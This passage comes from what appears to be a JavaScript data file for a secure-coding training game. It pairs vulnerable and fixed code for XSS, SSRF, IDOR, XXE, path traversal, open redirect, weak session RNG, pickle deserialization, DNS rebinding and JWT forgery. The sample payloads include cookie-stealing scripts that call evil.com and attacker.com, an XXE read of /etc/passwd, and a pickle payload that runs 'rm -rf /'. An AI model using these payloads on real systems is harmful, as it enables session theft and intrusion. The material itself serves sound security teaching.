        html += \`<div class="comment">\${c.content}</div>\`;
    });
    res.send(html);
});`,
        exploitedCode: `app.post('/api/comments', async (req, res) => {
    // 🔴 EXPLOITED: Attacker posts comment with script
    const { postId, content } = req.body;
    // content = "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"
    await db.comments.insert({ postId, content, userId: req.user.id });
    // ✓ Malicious script stored in database!
});

app.get('/post/:id', async (req, res) => {
    const post = await db.posts.findById(req.params.id);
    const comments = await db.comments.find({ postId: req.params.id });
    
    let html = \`<h1>\${post.title}</h1>\`;
    comments.forEach(c => {
        html += \`<div class="comment"><script>fetch('https://evil.com/steal?c='+document.cookie)</script></div>\`;
        // ✓ Every visitor executes attacker's script!
    });
    res.send(html);
});`,
        secureCode: `const escapeHtml = require('escape-html');

app.post('/api/comments', async (req, res) => {
    const { postId, content } = req.body;
    await db.comments.insert({ postId, content, userId: req.user.id });
    res.json({ success: true });
});

app.get('/post/:id', async (req, res) => {
    const post = await db.posts.findById(req.params.id);
    const comments = await db.comments.find({ postId: req.params.id });
    
    let html = \`<h1>\${escapeHtml(post.title)}</h1>\`;
    comments.forEach(c => {
        html += \`<div class="comment">\${escapeHtml(c.content)}</div>\`;
    });
    res.send(html);
});`,
        secureExploitedCode: `const escapeHtml = require('escape-html');

app.get('/post/:id', async (req, res) => {
    // ✅ SAFE: Same malicious comment from database
    const comments = await db.comments.find({ postId: req.params.id });
    // comment.content = "<script>steal()</script>"
    
    let html = \`<h1>\${escapeHtml(post.title)}</h1>\`;
    comments.forEach(c => {
        html += \`<div class="comment">\${escapeHtml(c.content)}</div>\`;
        // Outputs: &lt;script&gt;steal()&lt;/script&gt;
        // ✅ Displayed as text, not executed!
    });
    res.send(html);
    // ✅ Users see "<script>steal()</script>" as plain text
});`,
        vulnerableLines: [13],
        explanation: 'Stored XSS is more dangerous than reflected XSS because the attack persists. Every user who views the page executes the malicious script. Always sanitize output, especially user-generated content from the database.',
        hints: [
            'Where is the user input being displayed?',
            'Is data from the database always safe?',
            'How many users could be affected?'
        ],
        vulnerabilityType: 'Cross-Site Scripting (XSS)',
        severity: 'high',
        cwe: 'CWE-79',
        owasp: 'A03:2021 - Injection',
        exploitExample: {
            title: 'Persistent Script Injection',
            description: 'Malicious script stored in database affects all viewers',
            payload: `Comment: <script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>`,
            result: `✓ Script stored in database
✓ Every visitor's browser executes it
✓ Mass cookie/session theft
✓ Can spread like a worm`
        }
    },
    {
        id: 'xss-dom',
        title: 'DOM-based XSS',
        description: 'Client-side JavaScript processes URL fragment unsafely.',
        language: 'javascript',
        category: 'xss',
        difficulty: 'hard',
        vulnerableCode: `// Client-side JavaScript
const searchTerm = window.location.hash.substring(1);
document.getElementById('search-term').innerHTML = 'Searching for: ' + searchTerm;

// URL: https://site.com/search#laptop
// Displays: "Searching for: laptop"`,
        exploitedCode: `// 🔴 EXPLOITED: Attacker sends link with malicious hash
// URL: https://site.com/search#<img src=x onerror=alert(document.cookie)>

const searchTerm = window.location.hash.substring(1);
// searchTerm = "<img src=x onerror=alert(document.cookie)>"

document.getElementById('search-term').innerHTML = 'Searching for: ' + searchTerm;
// DOM now contains: <img src=x onerror=alert(document.cookie)>
// ✓ Browser tries to load image, fails, executes onerror!
// ✓ Never hits the server - pure client-side attack!`,
        secureCode: `const searchTerm = window.location.hash.substring(1);
document.getElementById('search-term').textContent = 'Searching for: ' + searchTerm;
// textContent treats input as text, not HTML`,
        secureExploitedCode: `// ✅ SAFE: Same malicious URL
// URL: https://site.com/search#<img src=x onerror=steal()>

const searchTerm = window.location.hash.substring(1);
// searchTerm = "<img src=x onerror=steal()>"

document.getElementById('search-term').textContent = 'Searching for: ' + searchTerm;
// ✅ textContent escapes HTML automatically
// ✅ Displays literal text: "<img src=x onerror=steal()>"
// ✅ No script execution!`,
        vulnerableLines: [3],
        explanation: 'DOM-based XSS happens entirely in the browser. The malicious payload in the URL fragment (#) never reaches the server, making it invisible to server-side security. Use textContent instead of innerHTML when displaying user input.',
        hints: [
            'What is the difference between innerHTML and textContent?',
            'Does the URL fragment get sent to the server?',
            'What sources can attackers control in the browser?'
        ],
        vulnerabilityType: 'Cross-Site Scripting (XSS)',
        severity: 'high',
        cwe: 'CWE-79',
        owasp: 'A03:2021 - Injection',
        exploitExample: {
            title: 'Client-Side Only Attack',
            description: 'Attacker crafts URL that executes script without server involvement',
            payload: `https://trusted-site.com/search#<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`,
            result: `✓ Victim clicks link to trusted site
✓ URL fragment processed by JavaScript
✓ Script executes in victim's browser
✓ Server logs show nothing suspicious`
        }
    },
    {
        id: 'ssrf-basic',
        title: 'Basic SSRF via Image URL',
        description: 'Image proxy fetches user-provided URLs without validation.',
        language: 'python',
        category: 'ssrf',
        difficulty: 'easy',
        vulnerableCode: `@app.route('/proxy-image')
def proxy_image():
    url = request.args.get('url')
    response = requests.get(url)
    return Response(response.content, mimetype='image/png')`,
        exploitedCode: `@app.route('/proxy-image')
def proxy_image():
    # 🔴 EXPLOITED: Attacker requests internal resource
    url = request.args.get('url')
    # url = "http://localhost:8080/admin/delete-all"
    
    response = requests.get(url)
    # ✓ Server makes request to internal admin panel!
    # ✓ Can access services behind firewall
    return Response(response.content, mimetype='image/png')`,
        secureCode: `from urllib.parse import urlparse

BLOCKED_HOSTS = ['localhost', '127.0.0.1', '169.254.169.254', '0.0.0.0']

@app.route('/proxy-image')
def proxy_image():
    url = request.args.get('url')
    parsed = urlparse(url)
    
    if parsed.hostname in BLOCKED_HOSTS or parsed.hostname.startswith('10.') or parsed.hostname.startswith('192.168.'):
        return 'Blocked', 403
    
    response = requests.get(url, timeout=5)
    return Response(response.content, mimetype='image/png')`,
        secureExploitedCode: `from urllib.parse import urlparse

BLOCKED_HOSTS = ['localhost', '127.0.0.1', '169.254.169.254']

@app.route('/proxy-image')
def proxy_image():
    # ✅ SAFE: Same attack "http://localhost:8080/admin"
    url = request.args.get('url')
    parsed = urlparse(url)
    # parsed.hostname = "localhost"
    
    if parsed.hostname in BLOCKED_HOSTS:
        return 'Blocked', 403
        # ✅ Returns 403 - attack blocked!
    
    response = requests.get(url, timeout=5)
    return Response(response.content, mimetype='image/png')`,
        vulnerableLines: [4],
        explanation: 'The server fetches any URL the user provides. Attackers can use this to access internal services, scan internal networks, or retrieve cloud metadata credentials.',
        hints: [
            'What URLs should be forbidden?',
            'Can internal services be accessed?',
            'What about cloud metadata endpoints?'
        ],
        vulnerabilityType: 'Server-Side Request Forgery',
        severity: 'high',
        cwe: 'CWE-918',
        owasp: 'A10:2021 - SSRF',
        exploitExample: {
            title: 'Internal Service Access',
            description: 'Attacker accesses internal services through the proxy',
            payload: `/proxy-image?url=http://localhost:8080/admin
/proxy-image?url=http://192.168.1.1/router-config`,
            result: `✓ Server fetches internal URLs
✓ Attacker sees admin panel content
✓ Can access any internal service`
        }
    },
    {
        id: 'idor-direct',
        title: 'Direct Object Reference in API',
        description: 'API endpoint exposes internal object IDs without access control.',
        language: 'javascript',
        category: 'idor',
        difficulty: 'easy',
        vulnerableCode: `app.get('/api/invoice/:id', async (req, res) => {
    const invoice = await Invoice.findById(req.params.id);
    res.json(invoice);
});`,
        exploitedCode: `// 🔴 EXPLOITED: Attacker changes invoice ID
app.get('/api/invoice/:id', async (req, res) => {
    const invoice = await Invoice.findById(req.params.id);
    // req.params.id = "INV-0001" (belongs to another company!)
    
    res.json(invoice);
    // ✓ Returns competitor's invoice with pricing!
    // { customerId: "ACME Corp", items: [...], total: "$50,000" }
});`,
        secureCode: `app.get('/api/invoice/:id', authMiddleware, async (req, res) => {
    const invoice = await Invoice.findById(req.params.id);
    
    if (!invoice || invoice.companyId !== req.user.companyId) {
        return res.status(404).json({ error: 'Invoice not found' });
    }
    
    res.json(invoice);
});`,
        secureExploitedCode: `// ✅ SAFE: Same attack - trying to access INV-0001
app.get('/api/invoice/:id', authMiddleware, async (req, res) => {
    const invoice = await Invoice.findById(req.params.id);
    // invoice.companyId = "ACME" (different company)
    // req.user.companyId = "Attacker Inc"
    
    if (!invoice || invoice.companyId !== req.user.companyId) {
        return res.status(404).json({ error: 'Invoice not found' });
        // ✅ Returns 404 - can't access other company's data!
    }
    
    res.json(invoice);  // Never reached
});`,
        vulnerableLines: [2, 3],
        explanation: 'The API returns any invoice by ID without checking if the requesting user should have access. Attackers can enumerate invoice IDs to access confidential business data.',
        hints: [
            'Who should be able to see this invoice?',
            'What if someone guesses another ID?',
            'Is there any ownership check?'
        ],
        vulnerabilityType: 'Insecure Direct Object Reference',
        severity: 'high',
        cwe: 'CWE-639',
        owasp: 'A01:2021 - Broken Access Control',
        exploitExample: {
            title: 'Invoice Enumeration',
            description: 'Attacker iterates through invoice IDs to steal business data',
            payload: `GET /api/invoice/INV-0001
GET /api/invoice/INV-0002
GET /api/invoice/INV-0003`,
            result: `✓ Access to all invoices in system
✓ Competitor pricing exposed
✓ Customer lists leaked`
        }
    },
    {
        id: 'xxe-xml-parser-easy',
        title: 'XXE in XML Parser',
        description: 'XML External Entity vulnerability allowing file disclosure through unsafe XML parsing.',
        language: 'python',
        category: 'xxe',
        difficulty: 'easy',
        vulnerableCode: `from lxml import etree

def parse_user_data(xml_string):
    # Parse XML from user input
    parser = etree.XMLParser()
    doc = etree.fromstring(xml_string, parser)
    
    user_data = {
        'name': doc.find('name').text,
        'email': doc.find('email').text,
        'role': doc.find('role').text
    }
    
    return user_data`,
        exploitedCode: `from lxml import etree

def parse_user_data(xml_string):
    # Parse XML from user input
    parser = etree.XMLParser()
    # Malicious XXE payload:
    # <?xml version="1.0"?>
    # <!DOCTYPE data [
    #   <!ENTITY xxe SYSTEM "file:///etc/passwd">
    # ]>
    # <user><name>&xxe;</name><email>test@test.com</email><role>user</role></user>
    doc = etree.fromstring(xml_string, parser)
    
    user_data = {
        'name': doc.find('name').text,  # Returns contents of /etc/passwd
        'email': doc.find('email').text,
        'role': doc.find('role').text
    }
    
    return user_data`,
        secureCode: `from lxml import etree

def parse_user_data(xml_string):
    # Secure parser - disable external entities
    parser = etree.XMLParser(
        resolve_entities=False,
        no_network=True,
        dtd_validation=False,
        load_dtd=False
    )
    
    try:
        doc = etree.fromstring(xml_string, parser)
        
        user_data = {
            'name': doc.find('name').text,
            'email': doc.find('email').text,
            'role': doc.find('role').text
        }
        
        return user_data
    except etree.XMLSyntaxError:
        raise ValueError("Invalid XML format")`,
        secureExploitedCode: `from lxml import etree

def parse_user_data(xml_string):
    # Secure parser - disable external entities
    parser = etree.XMLParser(
        resolve_entities=False,  # Prevents XXE
        no_network=True,
        dtd_validation=False,
        load_dtd=False
    )
    
    try:
        # XXE payload blocked by secure parser
        doc = etree.fromstring(xml_string, parser)
        
        user_data = {
            'name': doc.find('name').text,  # External entity ignored
            'email': doc.find('email').text,
            'role': doc.find('role').text
        }
        
        return user_data
    except etree.XMLSyntaxError:
        raise ValueError("Invalid XML format")`,
        vulnerableLines: [5, 6],
        explanation: 'The vulnerable code uses XMLParser without disabling external entity resolution. Attackers can inject DTD declarations to read local files or perform SSRF. The secure version disables resolve_entities, no_network, and DTD loading.',
        hints: [
            'Check how the XMLParser is configured',
            'External entities can reference local files',
            'Look for parser options that prevent external resource loading'
        ],
        vulnerabilityType: 'XML External Entity (XXE)',
        severity: 'high',
        cwe: 'CWE-611',
        owasp: 'A05:2021 – Security Misconfiguration',
        exploitExample: {
            title: 'Read /etc/passwd',
            description: 'Inject DTD to read sensitive system files',
            payload: '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name><email>x@x.com</email><role>user</role></user>',
            result: 'Returns /etc/passwd contents in name field'
        }
    },
    {
        id: 'path-traversal-easy',
        title: 'Path Traversal in File Read',
        description: 'Directory traversal vulnerability allowing unauthorized file access through path manipulation.',
        language: 'python',
        category: 'traversal',
        difficulty: 'easy',
        vulnerableCode: `import os

def read_user_file(filename):
    # Read files from user uploads directory
    base_dir = '/var/www/uploads'
    file_path = os.path.join(base_dir, filename)
    
    with open(file_path, 'r') as f:
        return f.read()`,
        exploitedCode: `import os

def read_user_file(filename):
    # Read files from user uploads directory
    base_dir = '/var/www/uploads'
    # Attacker sends: ../../etc/passwd
    file_path = os.path.join(base_dir, filename)  # Results in /var/www/uploads/../../etc/passwd
    
    with open(file_path, 'r') as f:  # Opens /etc/passwd
        return f.read()`,
        secureCode: `import os
from pathlib import Path

def read_user_file(filename):
    # Read files from user uploads directory
    base_dir = Path('/var/www/uploads').resolve()
    
    # Prevent directory traversal
    requested_path = (base_dir / filename).resolve()
    
    # Ensure the resolved path is within base_dir
    if not str(requested_path).startswith(str(base_dir)):
        raise ValueError("Access denied: Path traversal detected")
    
    with open(requested_path, 'r') as f:
        return f.read()`,
        secureExploitedCode: `import os
from pathlib import Path

def read_user_file(filename):
    # Read files from user uploads directory
    base_dir = Path('/var/www/uploads').resolve()
    
    # Prevent directory traversal
    # Attacker sends: ../../etc/passwd
    requested_path = (base_dir / filename).resolve()  # Resolves to /etc/passwd
    
    # Ensure the resolved path is within base_dir
    if not str(requested_path).startswith(str(base_dir)):  # /etc/passwd doesn't start with /var/www/uploads
        raise ValueError("Access denied: Path traversal detected")  # Blocked!
    
    with open(requested_path, 'r') as f:
        return f.read()`,
        vulnerableLines: [6],
        explanation: 'The vulnerable code directly concatenates user input to the base directory without validation. Attackers can use ../ sequences to escape the intended directory. The secure version resolves paths and validates they remain within the base directory.',
        hints: [
            'Look at how filename is combined with base_dir',
            'What happens if filename contains ../?',
            'How can you ensure the final path stays within base_dir?'
        ],
        vulnerabilityType: 'Path Traversal',
        severity: 'high',
        cwe: 'CWE-22',
        owasp: 'A01:2021 – Broken Access Control',
        exploitExample: {
            title: 'Read /etc/passwd',
            description: 'Use directory traversal to escape uploads folder',
            payload: '../../etc/passwd',
            result: 'Reads /etc/passwd instead of files in uploads'
        }
    },
    {
        id: 'open-redirect-easy',
        title: 'Open Redirect in Login',
        description: 'Unvalidated redirect vulnerability allowing phishing attacks through malicious URLs.',
        language: 'javascript',
        category: 'redirect',
        difficulty: 'easy',
        vulnerableCode: `app.get('/login', (req, res) => {
    const { returnUrl } = req.query;
    
    if (req.session.user) {
        // Redirect to returnUrl after login
        return res.redirect(returnUrl || '/dashboard');
    }
    
    res.render('login', { returnUrl });
});

app.post('/login', (req, res) => {
    const { username, password, returnUrl } = req.body;
    
    if (validateCredentials(username, password)) {
        req.session.user = username;
        res.redirect(returnUrl || '/dashboard');
    } else {
        res.render('login', { error: 'Invalid credentials' });
    }
});`,
        exploitedCode: `app.get('/login', (req, res) => {
    // Attacker sends: /login?returnUrl=https://evil.com/phishing
    const { returnUrl } = req.query;
    
    if (req.session.user) {
        // Redirects to evil.com after login
        return res.redirect(returnUrl || '/dashboard');
    }
    
    res.render('login', { returnUrl });
});

app.post('/login', (req, res) => {
    const { username, password, returnUrl } = req.body;
    
    if (validateCredentials(username, password)) {
        req.session.user = username;
        res.redirect(returnUrl || '/dashboard');  // Redirects to attacker site
    } else {
        res.render('login', { error: 'Invalid credentials' });
    }
});`,
        secureCode: `app.get('/login', (req, res) => {
    const { returnUrl } = req.query;
    const safeReturnUrl = validateReturnUrl(returnUrl);
    
    if (req.session.user) {
        return res.redirect(safeReturnUrl);
    }
    
    res.render('login', { returnUrl: safeReturnUrl });
});

app.post('/login', (req, res) => {
    const { username, password, returnUrl } = req.body;
    const safeReturnUrl = validateReturnUrl(returnUrl);
    
    if (validateCredentials(username, password)) {
        req.session.user = username;
        res.redirect(safeReturnUrl);
    } else {
        res.render('login', { error: 'Invalid credentials' });
    }
});

function validateReturnUrl(url) {
    if (!url) return '/dashboard';
    
    // Only allow relative paths or same-origin URLs
    try {
        const parsed = new URL(url, 'http://localhost');
        if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
            return '/dashboard';
        }
        // Only allow paths (relative URLs)
        if (url.startsWith('/') && !url.startsWith('//')) {
            return url;
        }
        return '/dashboard';
    } catch {
        return '/dashboard';
    }
}`,
        secureExploitedCode: `app.get('/login', (req, res) => {
    // Attacker sends: /login?returnUrl=https://evil.com/phishing
    const { returnUrl } = req.query;
    const safeReturnUrl = validateReturnUrl(returnUrl);  // Returns /dashboard
    
    if (req.session.user) {
        return res.redirect(safeReturnUrl);  // Redirects to /dashboard
    }
    
    res.render('login', { returnUrl: safeReturnUrl });
});

app.post('/login', (req, res) => {
    const { username, password, returnUrl } = req.body;
    const safeReturnUrl = validateReturnUrl(returnUrl);
    
    if (validateCredentials(username, password)) {
        req.session.user = username;
        res.redirect(safeReturnUrl);  // Safe redirect
    } else {
        res.render('login', { error: 'Invalid credentials' });
    }
});

function validateReturnUrl(url) {
    if (!url) return '/dashboard';
    
    // Only allow relative paths or same-origin URLs
    try {
        const parsed = new URL(url, 'http://localhost');
        if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
            return '/dashboard';
        }
        // Only allow paths (relative URLs) - blocks https://evil.com
        if (url.startsWith('/') && !url.startsWith('//')) {
            return url;
        }
        return '/dashboard';  // Blocked external redirect
    } catch {
        return '/dashboard';
    }
}`,
        vulnerableLines: [6, 18],
        explanation: 'The vulnerable code blindly redirects to user-controlled URLs, enabling phishing attacks. Attackers craft login links that redirect to fake sites after authentication. The secure version validates returnUrl to only allow relative paths within the application.',
        hints: [
            'What controls the redirect destination?',
            'Can returnUrl point to external sites?',
            'How can you restrict redirects to your application?'
        ],
        vulnerabilityType: 'Open Redirect',
        severity: 'medium',
        cwe: 'CWE-601',
        owasp: 'A01:2021 – Broken Access Control',
        exploitExample: {
            title: 'Phishing via Open Redirect',
            description: 'Redirect users to attacker site that looks like legitimate login',
            payload: 'https://legitimate.com/login?returnUrl=https://evil.com/steal-creds',
            result: 'User logs in successfully then gets redirected to evil.com'
        }
    },
    {
        id: 'weak-rng-session',
        title: 'Weak RNG for Session Tokens',
        description: 'Predictable session token generation using weak random number generator.',
        language: 'python',
        category: 'rng',
        difficulty: 'medium',
        vulnerableCode: `import random
import time

def generate_session_token():
    # Use time-seeded random for session token
    random.seed(int(time.time()))
    token = ''.join([str(random.randint(0, 9)) for _ in range(20)])
    return token

def create_session(user_id):
    token = generate_session_token()
    sessions[token] = {
        'user_id': user_id,
        'created_at': time.time()
    }
    return token`,
        exploitedCode: `import random
import time

def generate_session_token():
    # Use time-seeded random for session token
    # Attacker knows approximate time of token generation
    random.seed(int(time.time()))  # Predictable seed based on current second
    token = ''.join([str(random.randint(0, 9)) for _ in range(20)])
    return token  # Token can be predicted/brute-forced

def create_session(user_id):
    token = generate_session_token()
    sessions[token] = {
        'user_id': user_id,
        'created_at': time.time()
    }
    return token

# Attacker can generate all possible tokens for a given time window:
# for timestamp in range(current_time - 60, current_time + 60):
#     random.seed(timestamp)
#     possible_token = ''.join([str(random.randint(0, 9)) for _ in range(20)])
#     # Try using possible_token to hijack sessions`,
        secureCode: `import secrets
import hashlib
import time

def generate_session_token():
    # Use cryptographically secure random
    random_bytes = secrets.token_bytes(32)
    token = secrets.token_urlsafe(32)
    return token

def create_session(user_id):
    token = generate_session_token()
    # Hash token before storing for additional security
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    
    sessions[token_hash] = {
        'user_id': user_id,
        'created_at': time.time()
    }
    return token`,
        secureExploitedCode: `import secrets
import hashlib
import time

def generate_session_token():
    # Use cryptographically secure random - unpredictable
    random_bytes = secrets.token_bytes(32)
    token = secrets.token_urlsafe(32)  # Uses os.urandom, not seeded
    return token

def create_session(user_id):
    token = generate_session_token()
    # Hash token before storing for additional security
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    
    sessions[token_hash] = {
        'user_id': user_id,
        'created_at': time.time()
    }
    return token

# Attacker cannot predict tokens:
# secrets.token_urlsafe uses OS-level random source
# Each token has 256 bits of entropy
# No seed to exploit - brute force infeasible`,
        vulnerableLines: [6, 7],
        explanation: 'The vulnerable code uses random.seed() with time.time(), making tokens predictable. Attackers who know the approximate generation time can reproduce the random sequence. The secure version uses secrets module for cryptographically strong randomness.',
        hints: [
            'Is the random module suitable for security-sensitive tokens?',
            'What happens when you seed random with time.time()?',
            'What Python module should be used for cryptographic random?'
        ],
        vulnerabilityType: 'Weak Random Number Generation',
        severity: 'critical',
        cwe: 'CWE-338',
        owasp: 'A02:2021 – Cryptographic Failures',
        exploitExample: {
            title: 'Session Hijacking',
            description: 'Predict session tokens by brute-forcing time-based seeds',
            payload: 'for t in range(time.time()-60, time.time()+60): random.seed(t); generate_possible_tokens()',
            result: 'Attacker gains access to other user sessions'
        }
    },
    {
        id: 'deserialization-pickle',
        title: 'Unsafe Deserialization with Pickle',
        description: 'Insecure deserialization allowing arbitrary code execution through crafted pickle payloads.',
        language: 'python',
        category: 'deserialization',
        difficulty: 'hard',
        vulnerableCode: `import pickle
import base64

def load_user_preferences(encoded_data):
    # Deserialize user preferences from cookie
    data = base64.b64decode(encoded_data)
    preferences = pickle.loads(data)
    return preferences

@app.route('/preferences', methods=['POST'])
def update_preferences():
    prefs_cookie = request.cookies.get('preferences')
    if prefs_cookie:
        preferences = load_user_preferences(prefs_cookie)
        # Apply user preferences
        apply_theme(preferences.get('theme'))
        set_language(preferences.get('language'))
    return jsonify({'success': True})`,
        exploitedCode: `import pickle
import base64

def load_user_preferences(encoded_data):
    # Deserialize user preferences from cookie
    data = base64.b64decode(encoded_data)
    # Malicious pickle payload can execute arbitrary code:
    # class RCE:
    #     def __reduce__(self):
    #         import os
    #         return (os.system, ('rm -rf /',))
    # payload = pickle.dumps(RCE())
    preferences = pickle.loads(data)  # Executes attacker code!
    return preferences

@app.route('/preferences', methods=['POST'])
def update_preferences():
    prefs_cookie = request.cookies.get('preferences')
    if prefs_cookie:
        preferences = load_user_preferences(prefs_cookie)  # RCE here
        # Apply user preferences
        apply_theme(preferences.get('theme'))
        set_language(preferences.get('language'))
    return jsonify({'success': True})`,
        secureCode: `import json
import base64

def load_user_preferences(encoded_data):
    # Use JSON instead of pickle - no code execution
    data = base64.b64decode(encoded_data)
    preferences = json.loads(data.decode('utf-8'))
    
    # Validate schema
    allowed_keys = {'theme', 'language', 'timezone'}
    if not isinstance(preferences, dict):
        raise ValueError("Invalid preferences format")
    
    # Only allow expected keys
    preferences = {k: v for k, v in preferences.items() if k in allowed_keys}
    
    return preferences

@app.route('/preferences', methods=['POST'])
def update_preferences():
    prefs_cookie = request.cookies.get('preferences')
    if prefs_cookie:
        try:
            preferences = load_user_preferences(prefs_cookie)
            # Apply user preferences safely
            apply_theme(preferences.get('theme', 'dark'))
            set_language(preferences.get('language', 'en'))
        except (ValueError, json.JSONDecodeError):
            return jsonify({'error': 'Invalid preferences'}), 400
    return jsonify({'success': True})`,
        secureExploitedCode: `import json
import base64

def load_user_preferences(encoded_data):
    # Use JSON instead of pickle - no code execution
    data = base64.b64decode(encoded_data)
    # Attacker's malicious pickle payload fails here
    # JSON only deserializes data, not objects with __reduce__
    preferences = json.loads(data.decode('utf-8'))  # Raises JSONDecodeError on pickle data
    
    # Validate schema
    allowed_keys = {'theme', 'language', 'timezone'}
    if not isinstance(preferences, dict):
        raise ValueError("Invalid preferences format")
    
    # Only allow expected keys
    preferences = {k: v for k, v in preferences.items() if k in allowed_keys}
    
    return preferences

@app.route('/preferences', methods=['POST'])
def update_preferences():
    prefs_cookie = request.cookies.get('preferences')
    if prefs_cookie:
        try:
            preferences = load_user_preferences(prefs_cookie)  # Malicious pickle rejected
            # Apply user preferences safely
            apply_theme(preferences.get('theme', 'dark'))
            set_language(preferences.get('language', 'en'))
        except (ValueError, json.JSONDecodeError):
            return jsonify({'error': 'Invalid preferences'}), 400  # Attack blocked
    return jsonify({'success': True})`,
        vulnerableLines: [7],
        explanation: 'Pickle can execute arbitrary Python code during deserialization via __reduce__ magic method. Never unpickle untrusted data. The secure version uses JSON which only handles data, not code, and validates the structure.',
        hints: [
            'Can pickle execute code during deserialization?',
            'Is the data coming from a trusted source?',
            'What safer serialization formats exist?'
        ],
        vulnerabilityType: 'Insecure Deserialization',
        severity: 'critical',
        cwe: 'CWE-502',
        owasp: 'A08:2021 – Software and Data Integrity Failures',
        exploitExample: {
            title: 'Remote Code Execution',
            description: 'Craft pickle payload to execute system commands',
            payload: 'class RCE:\\n  def __reduce__(self): return (os.system, ("cat /etc/passwd",))',
            result: 'Arbitrary code execution on server'
        }
    },
    // NEW SNIPPETS - MVP Completion
    {
        id: 'ssrf-dns-rebinding',
        title: 'DNS Rebinding SSRF',
        description: 'Advanced SSRF attack using DNS rebinding to bypass IP-based blocklists.',
        language: 'javascript',
        category: 'ssrf',
        difficulty: 'hard',
        vulnerableCode: `const dns = require('dns');
const fetch = require('node-fetch');

async function fetchUrl(url) {
    const parsedUrl = new URL(url);
    
    // Check if IP is internal (blocklist approach)
    const addresses = await dns.promises.resolve4(parsedUrl.hostname);
    const isInternal = addresses.some(ip => 
        ip.startsWith('10.') || ip.startsWith('192.168.') || ip === '127.0.0.1'
    );
    
    if (isInternal) {
        throw new Error('Internal IPs not allowed');
    }
    
    // Fetch the URL (DNS may resolve differently now!)
    const response = await fetch(url);
    return response.text();
}`,
        exploitedCode: `// 🔴 DNS REBINDING ATTACK
// Attacker controls DNS for evil.com with very low TTL (1 second)

// Step 1: First DNS lookup returns external IP
// evil.com → 1.2.3.4 (attacker's server)

async function fetchUrl(url) {  // url = "http://evil.com/steal"
    const parsedUrl = new URL(url);
    
    // DNS lookup #1: Returns 1.2.3.4 (external)
    const addresses = await dns.promises.resolve4(parsedUrl.hostname);
    const isInternal = addresses.some(ip => 
        ip.startsWith('10.') || ip.startsWith('192.168.') || ip === '127.0.0.1'
    );
    // isInternal = false ✓ Passes check!
    
    // TTL expires, DNS cache cleared...
    // DNS lookup #2 (by fetch): Now returns 169.254.169.254!
    const response = await fetch(url);
    // ✓ Fetches from AWS metadata endpoint!
    return response.text();
}`,
        secureCode: `const dns = require('dns');
const fetch = require('node-fetch');
const { Agent } = require('http');

async function fetchUrl(url) {
    const parsedUrl = new URL(url);
    
    // Resolve DNS once and pin the IP
    const addresses = await dns.promises.resolve4(parsedUrl.hostname);
    const ip = addresses[0];
    
    // Check resolved IP
    const isInternal = ip.startsWith('10.') || 
                       ip.startsWith('192.168.') || 
                       ip.startsWith('169.254.') ||
                       ip === '127.0.0.1';
    
    if (isInternal) {
        throw new Error('Internal IPs not allowed');
    }
    
    // Use the resolved IP directly, bypassing DNS
    const agent = new Agent({
        lookup: (hostname, options, callback) => {
            callback(null, ip, 4);
        }
    });
    
    const response = await fetch(url, { agent });
    return response.text();
}`,
        secureExploitedCode: `// ✅ SAFE: DNS rebinding attack blocked
async function fetchUrl(url) {  // url = "http://evil.com/steal"
    const parsedUrl = new URL(url);
    
    // Resolve DNS once and PIN the IP
    const addresses = await dns.promises.resolve4(parsedUrl.hostname);
    const ip = addresses[0];  // 1.2.3.4 (first resolution)
    
    const isInternal = ip.startsWith('10.') || 
                       ip.startsWith('192.168.') || 
                       ip.startsWith('169.254.') ||
                       ip === '127.0.0.1';
    
    if (isInternal) {
        throw new Error('Internal IPs not allowed');
    }
    
    // Custom agent forces use of pinned IP
    const agent = new Agent({
        lookup: (hostname, options, callback) => {
            callback(null, ip, 4);  // Always use 1.2.3.4
        }
    });
    
    // Even if DNS changes, we use the validated IP
    const response = await fetch(url, { agent });
    // ✅ Connects to 1.2.3.4, not 169.254.169.254!
    return response.text();
}`,
        vulnerableLines: [15, 16],
        explanation: 'DNS rebinding exploits the time gap between DNS validation and actual request. Attacker controls a domain with low TTL, first returning a safe IP to pass validation, then switching to an internal IP for the actual request.',
        hints: [
            'What happens if DNS returns different IPs at different times?',
            'How can you ensure the validated IP is used for the request?',
            'Research DNS rebinding attacks'
        ],
        vulnerabilityType: 'Server-Side Request Forgery (DNS Rebinding)',
        severity: 'critical',
        cwe: 'CWE-918',
        owasp: 'A10:2021 - SSRF',
        exploitExample: {
            title: 'DNS Rebinding to Access Metadata',
            description: 'Attacker uses DNS rebinding to bypass IP validation',
            payload: `1. Attacker sets up evil.com with TTL=1
2. First lookup: evil.com → 1.2.3.4 (passes check)
3. Wait for TTL to expire
4. Second lookup: evil.com → 169.254.169.254`,
            result: 'Server fetches from AWS metadata endpoint, leaking credentials'
        }
    },
    {
        id: 'idor-jwt-claim',
        title: 'IDOR via JWT Claim Manipulation',
        description: 'Authorization bypass by modifying JWT claims when signature is not properly validated.',
        language: 'javascript',
        category: 'idor',
        difficulty: 'hard',
        vulnerableCode: `const jwt = require('jsonwebtoken');

app.get('/api/admin/users', (req, res) => {
    const token = req.headers.authorization?.split(' ')[1];
    
    // Decode without verification
    const decoded = jwt.decode(token);
    
    if (decoded.role !== 'admin') {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    // Return all users
    const users = db.users.find({});
    res.json(users);
});`,
        exploitedCode: `// 🔴 EXPLOITED: Attacker modifies JWT payload
// Original token payload: {"userId": "123", "role": "user"}
// Attacker decodes, changes role, re-encodes (no signature needed!)

// Attacker's modified token:
// Header: {"alg":"none","typ":"JWT"}
// Payload: {"userId": "123", "role": "admin"}
// Signature: (empty)

app.get('/api/admin/users', (req, res) => {
    const token = req.headers.authorization?.split(' ')[1];
    
    // jwt.decode() does NOT verify signature!
    const decoded = jwt.decode(token);
    // decoded = {"userId": "123", "role": "admin"}
    
    if (decoded.role !== 'admin') {  // "admin" === "admin" ✓
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    // ✓ Attacker gets all user data!
    const users = db.users.find({});
    res.json(users);
});`,
        secureCode: `const jwt = require('jsonwebtoken');

app.get('/api/admin/users', (req, res) => {
    const token = req.headers.authorization?.split(' ')[1];
    
    try {
